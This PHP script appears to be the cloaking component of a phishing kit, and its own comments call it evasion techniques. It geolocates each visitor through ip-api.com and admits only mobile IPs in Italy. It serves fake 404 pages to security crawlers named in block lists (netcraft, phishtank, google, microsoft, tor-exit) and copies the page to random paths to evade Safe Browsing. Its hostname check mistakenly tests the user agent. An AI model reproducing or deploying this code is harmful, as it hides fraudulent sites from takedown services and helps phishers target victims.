<?php

//
// Enabling, disabling and config evasion techniques
//

// Evasion Techniques: IP Blocking
$ip_blocking = True;
$ip_blocking_array = ["^192.168.*.*"];

// Evasion Techniques: Geo-Blocking
$geoblocking_by_ip_allowed_mobile = True;
$geoblocking_by_ip_allowed_countries = True;
$geoblocking_by_ip_allowed_countries_array = ["IT"];

// Evasion Techniques Hostname
$hostname_blocking = True;
$hostname_blocking_array = ["netcraft", "phishtank", "google", "microsoft", "tor-exit"];

// Evasion Techniques: User Agent
$user_agent_blocking = True;
$user_agent_blocking_array = ["netcraft", "phishtank", "google", "crawler", "tor-exit"];

// Evasion Techniques: Random Path
$generate_random_path = True;


//
//
//

// IP Address, Hostname and User Agent of Visitor
$ipaddress_visitor = getenv("HTTP_CLIENT_IP") ?: getenv("HTTP_X_FORWARDED_FOR") ?:
    getenv("HTTP_X_FORWARDED") ?:
        getenv("HTTP_FORWARDED_FOR") ?:
            getenv("HTTP_FORWARDED") ?:
                getenv("REMOTE_ADDR");
$hostname_visitor = gethostbyaddr($ipaddress_visitor);
$user_agent_visitor = getenv("HTTP_USER_AGENT");

//
// Get the information of the IP from ip-api.com
//
$curl = curl_init();
curl_setopt_array($curl, array(
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_ENCODING => "UTF-8",
    CURLOPT_URL => "http://ip-api.com/json/" . $ipaddress_visitor . "?fields=status,message,countryCode,isp,org,as,mobile,proxy,hosting"
));
$result = utf8_encode(curl_exec($curl));
$array = json_decode($result, true);
curl_close($curl);

if ($array["status"] === "success") {
    $ipaddress_asn = $array["as"];
    $ipaddress_isp = $array["isp"];
    $ipaddress_org = $array["org"];
    $ipaddress_proxy = $array["proxy"];
    $ipaddress_hosting = $array["hosting"];
    $ipaddress_mobile = $array["mobile"];
    $ipaddress_country_code = $array["countryCode"];
}

//
// Geo-Blocking: Only device with mobile IP address are authorized
//
if ($geoblocking_by_ip_allowed_mobile) {
    if ($ipaddress_mobile === False) {
        header("HTTP/1.0 404 Not Found");
        die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
    }
}

//
// Geo-Blocking: Only devices with a specific country code are authorized
//
if ($geoblocking_by_ip_allowed_countries) {
    if (!in_array($ipaddress_country_code, $geoblocking_by_ip_allowed_countries_array)) {
        header("HTTP/1.0 404 Not Found");
        die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
    }

}

//
// IP Blocking: Some IP addresses cannot access to the site
//
if ($ip_blocking) {
    foreach ($ip_blocking_array as $ip) {
        if (preg_match("/" . $ip . "/", $ipaddress_visitor)) {
            header("HTTP/1.0 404 Not Found");
            die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
        }
    }

}

//
// Hostname Blocking: Some hostname cannot access to the site
//
if ($hostname_blocking) {
    foreach ($hostname_blocking_array as $hostname) {
        if (strpos($user_agent_visitor, $hostname) !== false) {
            header("HTTP/1.0 404 Not Found");
            die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
        }
    }
}

//
// User Agent Blocking: Some user agent cannot access to the site
//
if ($user_agent_blocking) {
    foreach ($user_agent_blocking_array as $user_aget) {
        if (strpos($user_agent_visitor, $user_aget) !== false) {
            header("HTTP/1.0 404 Not Found");
            die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
        }
    }
}

//
// Generate Random Path to evade Safe Browsing
//
if ($generate_random_path) {
    $unixtime = time();
    $randomint = rand(100, 1000);
    $randomindex = md5($unixtime + $randomint) . ".php";
    $basenameurl = basename($_SERVER["SCRIPT_NAME"]);

    if ($basenameurl === "index.php") {
        copy("index.php", $randomindex);
        header('Location: ' . $randomindex);
    }
}